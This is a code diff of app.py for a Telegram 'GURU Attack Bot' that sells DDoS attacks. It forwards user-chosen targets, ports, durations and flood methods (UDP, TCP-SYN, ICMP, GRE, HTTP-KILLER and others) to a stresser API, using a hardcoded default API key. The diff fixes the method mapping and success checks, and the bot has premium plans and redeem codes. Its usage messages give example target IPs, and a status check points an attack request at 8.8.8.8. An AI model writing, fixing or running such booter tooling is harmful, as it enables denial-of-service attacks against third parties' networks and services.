@@ -1,4 +1,4 @@
-# app.py - FIXED FOR PROPER API CONCURRENT SUPPORT
+# app.py - COMPLETE FIXED VERSION WITH PROPER API COMMUNICATION
 
 import os
 import logging
@@ -36,56 +36,47 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 
-# CONCURRENT SETTINGS - DEFAULT MATCHES WEBSITE
-DEFAULT_CONCURRENT = 2  # Website uses 7, bot uses 2 as requested
+# CONCURRENT SETTINGS - MATCHES WEBSITE
+DEFAULT_CONCURRENT = 2  # Bot uses 2 concurrent
 MIN_CONCURRENT = 1
 MAX_CONCURRENT = 8
 MIN_DURATION = 30
 MAX_DURATION = 300
 
-# ATTACK METHODS - MUST MATCH WEBSITE API
+# ATTACK METHODS - EXACTLY AS WEBSITE
 ATTACK_METHODS = [
-    "UDP-FLOOD",  # Maps to UDP-FREE
-    "UDP-VSE", "UDP-DNS",
-    "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
-    "ICMP-FLOOD", "GRE-FLOOD",
-    "TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"
+    "UDP-FLOOD",      # Maps to udp-flood
+    "UDP-VSE", 
+    "UDP-DNS",
+    "TCP-SYN", 
+    "TCP-ACK", 
+    "TCP-STOMP", 
+    "TCP-HANDSHAKE",
+    "ICMP-FLOOD", 
+    "GRE-FLOOD",
+    "TLSV2", 
+    "HTTPS-MIX", 
+    "HTTP-KILLER", 
+    "HTTP-DESTROYER", 
+    "HTTP-BYPASSER"
 ]
 
-# API METHOD MAPPING - MUST MATCH WEBSITE
+# API METHOD MAPPING - WEBSITE EXPECTS LOWER CASE
 METHOD_MAP = {
-    "UDP-FLOOD": "UDP-FREE",  # Website uses UDP-FREE
-    "UDP-VSE": "UDP-VSE", 
-    "UDP-DNS": "UDP-DNS",
-    "TCP-SYN": "TCP-SYN",
-    "TCP-ACK": "TCP-ACK",
-    "TCP-STOMP": "TCP-STOMP",
-    "TCP-HANDSHAKE": "TCP-HANDSHAKE",
-    "ICMP-FLOOD": "ICMP-FLOOD",
-    "GRE-FLOOD": "GRE-FLOOD",
+    "UDP-FLOOD": "udp-flood",
+    "UDP-VSE": "udp-vse", 
+    "UDP-DNS": "udp-dns",
+    "TCP-SYN": "tcp-syn",
+    "TCP-ACK": "tcp-ack",
+    "TCP-STOMP": "tcp-stomp",
+    "TCP-HANDSHAKE": "tcp-handshake",
+    "ICMP-FLOOD": "icmp-flood",
+    "GRE-FLOOD": "gre-flood",
     "TLSV2": "TLSV2",
     "HTTPS-MIX": "HTTPS-MIX",
     "HTTP-KILLER": "HTTP-KILLER",
     "HTTP-DESTROYER": "HTTP-DESTROYER",
     "HTTP-BYPASSER": "HTTP-BYPASSER"
-}
-
-# FIXED: API sends concs parameter properly
-API_PARAMS = {
-    "UDP-FREE": {"method": "UDP-FREE", "concs": "concs"},
-    "UDP-VSE": {"method": "UDP-VSE", "concs": "concs"},
-    "UDP-DNS": {"method": "UDP-DNS", "concs": "concs"},
-    "TCP-SYN": {"method": "TCP-SYN", "concs": "concs"},
-    "TCP-ACK": {"method": "TCP-ACK", "concs": "concs"},
-    "TCP-STOMP": {"method": "TCP-STOMP", "concs": "concs"},
-    "TCP-HANDSHAKE": {"method": "TCP-HANDSHAKE", "concs": "concs"},
-    "ICMP-FLOOD": {"method": "ICMP-FLOOD", "concs": "concs"},
-    "GRE-FLOOD": {"method": "GRE-FLOOD", "concs": "concs"},
-    "TLSV2": {"method": "TLSV2", "concs": "concs"},
-    "HTTPS-MIX": {"method": "HTTPS-MIX", "concs": "concs"},
-    "HTTP-KILLER": {"method": "HTTP-KILLER", "concs": "concs"},
-    "HTTP-DESTROYER": {"method": "HTTP-DESTROYER", "concs": "concs"},
-    "HTTP-BYPASSER": {"method": "HTTP-BYPASSER", "concs": "concs"}
 }
 
 logging.basicConfig(
@@ -99,7 +90,7 @@ app = Quart(__name__)
 # ===== API ROUTES =====
 @app.route('/')
 async def index():
-    return "🤖 GURU Attack Bot - UDP-FREE Default"
+    return "🤖 GURU Attack Bot - UDP-FLOOD Default"
 
 @app.route('/health')
 async def health():
@@ -125,19 +116,6 @@ async def concurrent_status():
         "remaining_time": stats['remaining_time'],
         "bot_default_concurrent": DEFAULT_CONCURRENT
     })
-
-@app.route('/api/test')
-async def api_test():
-    """Test API endpoint with current parameters"""
-    try:
-        test_result = await send_api_attack("8.8.8.8", "53", 30, "UDP-FLOOD", DEFAULT_CONCURRENT)
-        return jsonify({
-            "success": True,
-            "test": test_result,
-            "bot_concurrent": DEFAULT_CONCURRENT
-        })
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
 
 # ===== DATABASE =====
 class Database:
@@ -750,17 +728,20 @@ def init_pseudo_owner():
 init_owner()
 init_pseudo_owner()
 
-# ===== FIXED API FUNCTIONS =====
+# ===== FIXED API FUNCTIONS - MATCHES WEBSITE EXACTLY =====
 async def send_api_attack(target, port, duration, method, concurrent=2):
-    """Send attack to API - FIXED to match website exactly"""
+    """
+    Send attack to API with proper parameters matching website exactly
+    API Format: /api?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD&concs=CONCS
+    """
     api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
     api_url = os.getenv("API_URL", "https://mrstresser.com/api")
     
     if not api_key:
         return {"success": False, "error": "API Key missing"}
     
-    # FIXED: Use exact method mapping to match website
-    api_method = METHOD_MAP.get(method.upper(), "UDP-FREE")
+    # Get the method name as expected by API (lowercase for UDP methods)
+    api_method = METHOD_MAP.get(method.upper(), "udp-flood")
     
     # Build parameters EXACTLY like website
     params = {
@@ -769,10 +750,10 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
         "port": str(port),
         "time": str(duration),
         "method": api_method,
-        "concs": str(concurrent)  # FIXED: Use "concs" parameter
+        "concs": str(concurrent)  # CRITICAL: Website uses "concs" parameter
     }
     
-    # Advanced options for L7 methods - matches website
+    # Add advanced parameters for L7 methods
     if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
         params["req_method"] = "GET"
         params["geoloc"] = "MIX"
@@ -788,7 +769,7 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
     connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
     timeout = aiohttp.ClientTimeout(total=35, connect=15)
     
-    # FIXED: Log the exact request being sent
+    # Log the exact request being sent
     logger.info(f"🚀 Sending API Request:")
     logger.info(f"📡 URL: {api_url}")
     logger.info(f"📡 Params: {params}")
@@ -804,7 +785,7 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
                 try:
                     response_text = await response.text(encoding='utf-8', errors='ignore')
                     
-                    # Parse JSON if possible
+                    # Try to parse JSON
                     try:
                         response_data = json.loads(response_text)
                     except:
@@ -813,13 +794,13 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
                     logger.info(f"📊 API Response Status: {response.status} in {elapsed:.2f}s")
                     logger.info(f"📊 Response: {response_text[:200]}")
                     
-                    # FIXED: Check for success based on response
+                    # Check if attack was successful
                     if response.status == 200:
-                        # Check if attack was accepted
-                        if "error" not in str(response_data).lower():
+                        # Check for error in response
+                        if isinstance(response_data, dict) and response_data.get('error'):
                             return {
-                                "success": True,
-                                "elapsed": elapsed,
+                                "success": False,
+                                "error": response_data.get('error', 'API Error'),
                                 "status": response.status,
                                 "concurrent": concurrent,
                                 "response": response_data,
@@ -827,8 +808,8 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
                             }
                         else:
                             return {
-                                "success": False,
-                                "error": "API reported error",
+                                "success": True,
+                                "elapsed": elapsed,
                                 "status": response.status,
                                 "concurrent": concurrent,
                                 "response": response_data,
@@ -965,7 +946,7 @@ class AttackManager:
                         f"🎯 Target: `{target}:{port}`\n"
                         f"⏱️ Duration: `{duration}s`\n"
                         f"🔄 Concurrent: **{concurrent}**\n"
-                        f"📡 Method: `{method}` → UDP-FREE\n"
+                        f"📡 Method: `{method}`\n"
                         f"⚡ Status: SUCCESS\n"
                         f"⏱️ Response: `{result.get('elapsed', 0):.2f}s`",
                         parse_mode='Markdown'
@@ -1065,7 +1046,7 @@ async def send_attack_alert(attack_info, result=None):
             f"📊 Plan: {plan.upper()}\n"
             f"🎯 Target: `{attack_info['target']}:{attack_info['port']}`\n"
             f"⏱️ Duration: {attack_info['duration']}s\n"
-            f"📡 Method: {attack_info['method'].upper()} → UDP-FREE\n"
+            f"📡 Method: {attack_info['method'].upper()}\n"
             f"🔄 Concurrent: **{attack_info['concurrent']}**\n"
             f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
@@ -1125,7 +1106,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     remaining = stats['remaining_time']
     
     welcome_msg = (
-        f"👋 *WELCOME TO GURU*\n\n"
+        f"👋 *WELCOME TO GURU BOT*\n\n"
         f"Hello {first_name}! 👋\n"
         f"📊 Total Attacks: {total_attacks}\n"
         f"📊 Plan: {plan_display}\n"
@@ -1134,7 +1115,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⏱️ Remaining: {remaining}s\n"
         f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
         f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME'}\n"
-        f"📡 Default method: UDP-FLOOD → UDP-FREE\n"
+        f"📡 Default method: UDP-FLOOD\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
         f"⚡ *ATTACK FEATURES*\n"
         f"• {DEFAULT_CONCURRENT}x concurrent connections\n"
@@ -1176,13 +1157,13 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
-            f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
+            f"❌ *Usage:* `/attack IP PORT TIME [METHOD] [CONCURRENT]`\n\n"
             f"Example: `/attack 91.108.17.41 32001 60` (Uses UDP-FLOOD default)\n"
             f"With method: `/attack 91.108.17.41 32001 60 TCP-SYN`\n"
             f"With concurrent: `/attack 91.108.17.41 32001 60 UDP-FLOOD 4`\n\n"
             f"⚡ Current concurrent: **{DEFAULT_CONCURRENT}**\n"
             f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
-            f"📡 Default Method: UDP-FLOOD → UDP-FREE\n"
+            f"📡 Default Method: UDP-FLOOD\n"
             f"📡 Available methods: {', '.join(ATTACK_METHODS[:5])}...",
             parse_mode='Markdown'
         )
@@ -1230,13 +1211,11 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"❌ {msg}", parse_mode='Markdown')
             return
         
-        stats = attack_manager.get_stats()
-        
         await update.message.reply_text(
             f"✅ *ATTACK STARTED!*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
-            f"📡 Method: `{method}` → UDP-FREE\n"
+            f"📡 Method: `{method}`\n"
             f"🔄 Concurrent: **{concurrent}**\n"
             f"⚡ Status: **RUNNING**\n\n"
             f"⚠️ Only 1 attack at a time!\n"
@@ -1305,7 +1284,7 @@ async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_T
     except ValueError:
         await update.message.reply_text("❌ Invalid number!")
 
-async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Test API with custom parameters"""
     user_id = update.effective_user.id
     
@@ -1354,7 +1333,7 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📡 Target: `{target}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
             f"🔄 Concurrent: `{concurrent}`\n"
-            f"📡 Method: `{method}` → UDP-FREE\n\n"
+            f"📡 Method: `{method}`\n\n"
             f"⏳ Sending test request..."
         )
         
@@ -1368,7 +1347,7 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"✅ *API TEST SUCCESSFUL*\n\n"
                 f"📡 Target: `{target}:{port}`\n"
                 f"🔄 Concurrent: `{concurrent}`\n"
-                f"📡 Method: `{method}` → UDP-FREE\n"
+                f"📡 Method: `{method}`\n"
                 f"⚡ Status: `{result.get('status')}`\n"
                 f"⏱️ Response Time: `{result.get('elapsed', 0):.2f}s`\n\n"
                 f"📋 *API Response:*\n```\n{json.dumps(result.get('response', {}), indent=2)[:500]}\n```\n"
@@ -1390,99 +1369,6 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
-async def test_concurrents_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Test multiple concurrent values at once"""
-    user_id = update.effective_user.id
-    
-    if not db.is_owner_or_pseudo(user_id):
-        await update.message.reply_text("❌ Only owners can test!")
-        return
-    
-    args = context.args
-    if len(args) < 3:
-        await update.message.reply_text(
-            f"🔬 *TEST CONCURRENT VALUES*\n\n"
-            f"Usage: `/testconcs HOST PORT TIME [METHOD]`\n"
-            f"Example: `/testconcs 91.108.9.213 32000 60 UDP-FLOOD`\n\n"
-            f"This will test: 1, 2, 4, 8 concurrent values",
-            parse_mode='Markdown'
-        )
-        return
-    
-    try:
-        target = args[0]
-        port = int(args[1])
-        duration = int(args[2])
-        method = args[3].upper() if len(args) > 3 else "UDP-FLOOD"
-        
-        if method not in ATTACK_METHODS:
-            method = "UDP-FLOOD"
-        
-        status_msg = await update.message.reply_text(
-            f"🔬 *Testing Concurrent Values...*\n\n"
-            f"Target: `{target}:{port}`\n"
-            f"Method: `{method}` → UDP-FREE\n"
-            f"Testing: 1, 2, 4, 8\n\n"
-            f"⏳ Sending test requests...",
-            parse_mode='Markdown'
-        )
-        
-        test_values = [1, 2, 4, 8]
-        results = []
-        successful_values = []
-        
-        for concs in test_values:
-            result = await send_api_attack(target, port, duration, method, concs)
-            
-            status = "✅" if result.get('success') else "❌"
-            results.append(f"{status} concs={concs} → {result.get('status', 'Error')}")
-            
-            if result.get('success'):
-                successful_values.append(concs)
-            
-            await status_msg.edit_text(
-                f"🔬 *Testing Concurrent Values...*\n\n"
-                f"Target: `{target}:{port}`\n"
-                f"Method: `{method}` → UDP-FREE\n"
-                f"Progress: {len(results)}/{len(test_values)}\n\n"
-                f"Results:\n" + "\n".join(results),
-                parse_mode='Markdown'
-            )
-            
-            await asyncio.sleep(0.5)
-        
-        final_message = (
-            f"🔬 *Concurrent Test Results*\n\n"
-            f"Target: `{target}:{port}`\n"
-            f"Method: `{method}` → UDP-FREE\n\n"
-            f"*Results:*\n" + "\n".join(results) + "\n\n"
-        )
-        
-        if successful_values:
-            highest = max(successful_values)
-            final_message += (
-                f"💡 *Recommendation:*\n"
-                f"• Highest working concurrent: **{highest}**\n"
-                f"• Set default: `/setconcurrent {highest}`\n"
-                f"• Use in attack: `/attack {target} {port} {duration} {method} {highest}`\n\n"
-            )
-        else:
-            final_message += (
-                f"❌ *No concurrent values worked!*\n"
-                f"Try using the default API parameters.\n\n"
-            )
-        
-        final_message += (
-            f"📋 *Test specific values:*\n"
-            f"`/testapi {target} {port} {duration} 1 {method}`\n"
-            f"`/testapi {target} {port} {duration} 8 {method}`"
-        )
-        
-        await status_msg.edit_text(final_message, parse_mode='Markdown')
-        
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {str(e)}")
-
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
     users = db.get_all_users()
@@ -1497,7 +1383,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👥 Users: {len(users)}\n"
         f"💥 Attacks: {stats['total_attacks']}\n"
         f"📡 Methods: {len(ATTACK_METHODS)}\n"
-        f"📡 Default: UDP-FLOOD → UDP-FREE\n"
+        f"📡 Default: UDP-FLOOD\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s",
         parse_mode='Markdown'
     )
@@ -1568,7 +1454,7 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚠️ Only 1 attack at a time\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
         f"📊 Status: {'🔴 IDLE' if not stats['is_running'] else '🟢 RUNNING'}\n\n"
-        f"⭐ UDP-FLOOD is the default method → UDP-FREE\n\n"
+        f"⭐ UDP-FLOOD is the default method\n\n"
         f"After selecting, send: `IP PORT TIME`\n"
         f"Example: `91.108.17.41 32001 60`\n"
         f"To change concurrent: `IP PORT TIME CONCURRENT`",
@@ -1584,7 +1470,7 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     method = query.data.replace('method_', '')
     context.user_data['attack_method'] = method
     
-    is_default = "⭐ DEFAULT → UDP-FREE" if method == "UDP-FLOOD" else ""
+    is_default = "⭐ DEFAULT" if method == "UDP-FLOOD" else ""
     
     await query.edit_message_text(
         f"📡 *Method Selected: {method}* {is_default}\n\n"
@@ -1620,7 +1506,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📊 Plan: 💎 PREMIUM (Owner)\n"
                 f"⚡ {DEFAULT_CONCURRENT}x Concurrent\n"
                 f"📡 {len(ATTACK_METHODS)} Attack Methods\n"
-                "📡 Default: UDP-FLOOD → UDP-FREE\n"
+                "📡 Default: UDP-FLOOD\n"
                 "⏱️ Unlimited Attacks"
             )
         elif expiry:
@@ -1634,7 +1520,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"• {DEFAULT_CONCURRENT}x Concurrent\n"
                 f"• Only 1 attack at a time\n"
                 f"• {len(ATTACK_METHODS)} attack methods\n"
-                "• UDP-FLOOD → UDP-FREE default"
+                "• UDP-FLOOD default"
             )
         else:
             text = (
@@ -1645,7 +1531,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"• {DEFAULT_CONCURRENT}x Concurrent\n"
                 f"• Only 1 attack at a time\n"
                 f"• {len(ATTACK_METHODS)} attack methods\n"
-                "• UDP-FLOOD → UDP-FREE default"
+                "• UDP-FLOOD default"
             )
     
     await query.edit_message_text(
@@ -1681,7 +1567,7 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👑 Admins: {len(admins)}\n"
         f"💥 Attacks: {total_attacks}\n"
         f"🔄 Concurrent: {DEFAULT_CONCURRENT}\n"
-        f"📡 Default: UDP-FLOOD → UDP-FREE\n"
+        f"📡 Default: UDP-FLOOD\n"
         f"⚡ Status: {status_text}\n"
         f"⏱️ Remaining: {stats['remaining_time']}s\n"
         f"📡 Methods: {len(ATTACK_METHODS)}",
@@ -1923,7 +1809,7 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n"
         f"⚡ Attack: {status_text}\n"
         f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
-        f"📡 Default: UDP-FLOOD → UDP-FREE\n"
+        f"📡 Default: UDP-FLOOD\n"
         f"⏱️ Remaining: {stats['remaining_time']}s",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
@@ -2194,7 +2080,7 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "host": "8.8.8.8",
             "port": "53",
             "time": "30",
-            "method": "UDP-FREE",
+            "method": "udp-flood",
             "concs": str(DEFAULT_CONCURRENT)
         }
         
@@ -2227,7 +2113,7 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     message = f"❌ Error (Status: {response.status})"
                 
                 await query.edit_message_text(
-                    f"🔌 *API STATUS*\n\n{message}\n\n📊 Response: {str(response_data)[:200]}\n\n⚡ Concurrent: {DEFAULT_CONCURRENT}\n📡 Default: UDP-FLOOD → UDP-FREE",
+                    f"🔌 *API STATUS*\n\n{message}\n\n📊 Response: {str(response_data)[:200]}\n\n⚡ Concurrent: {DEFAULT_CONCURRENT}\n📡 Default: UDP-FLOOD",
                     parse_mode='Markdown',
                     reply_markup=InlineKeyboardMarkup([
                         [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
@@ -2306,7 +2192,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if len(parts) < 3:
             await update.message.reply_text(
                 f"❌ Use: `IP PORT TIME`\nExample: `91.108.17.41 32001 60`\n"
-                f"Default method: UDP-FLOOD → UDP-FREE",
+                f"Default method: UDP-FLOOD",
                 parse_mode='Markdown'
             )
             return
@@ -2345,7 +2231,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"✅ *ATTACK STARTED!*\n\n"
             f"🎯 Target: `{target}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
-            f"📡 Method: `{method}` → UDP-FREE\n"
+            f"📡 Method: `{method}`\n"
             f"🔄 Concurrent: **{concurrent}**\n"
             f"⚡ Status: **RUNNING**\n\n"
             f"⚠️ Only 1 attack at a time!",
@@ -2373,8 +2259,7 @@ def run_bot():
     app_bot.add_handler(CommandHandler("attack", attack_command))
     app_bot.add_handler(CommandHandler("stop", stop_command))
     app_bot.add_handler(CommandHandler("setconcurrent", set_concurrent_command))
-    app_bot.add_handler(CommandHandler("testapi", testapi_command))
-    app_bot.add_handler(CommandHandler("testconcs", test_concurrents_command))
+    app_bot.add_handler(CommandHandler("testapi", test_api_command))
     app_bot.add_handler(CommandHandler("status", status_command))
     app_bot.add_handler(CommandHandler("redeem", redeem_command))
     app_bot.add_handler(CommandHandler("cancel", cancel))
@@ -2417,20 +2302,22 @@ def run_bot():
 # ===== MAIN =====
 if __name__ == "__main__":
     print("=" * 60)
-    print("🔥 GURU ATTACK BOT - FIXED FOR API CONCURRENT 🔥")
+    print("🔥 GURU ATTACK BOT - PROPER API COMMUNICATION 🔥")
     print(f"⚡ DEFAULT CONCURRENT: {DEFAULT_CONCURRENT}")
     print(f"📊 CONCURRENT RANGE: {MIN_CONCURRENT}-{MAX_CONCURRENT}")
     print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
-    print(f"📡 Default Method: UDP-FLOOD → UDP-FREE")
+    print(f"📡 Default Method: UDP-FLOOD")
     print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
     print("=" * 60)
     print("💡 Commands:")
     print("  /attack IP PORT TIME [METHOD] [CONCURRENT] - Start attack")
     print("  /setconcurrent NUMBER - Change concurrent value")
     print("  /testapi HOST PORT TIME [CONCURRENT] [METHOD] - Test API")
-    print("  /testconcs HOST PORT TIME [METHOD] - Test all concurrent values")
     print("  /status - Show bot status")
     print("  /stop - Stop running attack")
+    print("  /redeem CODE - Redeem premium code")
+    print("=" * 60)
+    print("📝 API Format: /api?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD&concs=CONCS")
     print("=" * 60)
     
     try:
